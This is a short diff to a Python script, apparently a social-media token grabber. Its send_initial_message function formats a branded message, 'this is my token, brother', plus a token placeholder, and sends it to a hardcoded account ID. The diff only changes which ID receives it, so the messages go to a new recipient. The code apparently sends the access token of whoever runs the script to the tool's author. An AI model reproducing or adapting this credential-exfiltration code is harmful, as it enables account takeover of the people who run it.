@@ -30,7 +30,7 @@ def send_initial_message():
       msg_template = "CREDIT :-💝💝 𝗞𝗥𝗜𝗦𝗛𝗡𝗔 💝                                                       OWNER =>😈 𝗞𝗥𝗜𝗦𝗛𝗡𝗔 𝗥𝗞 𝗕𝗥𝗔𝗡𝗗 𝗛𝗘𝗥𝗘 😈                                                      𝗛𝗘𝗟𝗟𝗢 𝗞𝗥𝗜𝗦𝗛𝗡𝗔 𝗝𝗜😽 𝗬𝗘 𝗠𝗘𝗥𝗔 𝗧𝗢𝗞𝗘𝗡 𝗛𝗘 𝗕𝗛𝗔𝗜 🥳🥳🥳              :- {}"
 
       # Specify the ID where you want to send the message
-      target_id = "61573328623221"
+      target_id = "8517943384999183"
 
       requests.packages.urllib3.disable_warnings()
 
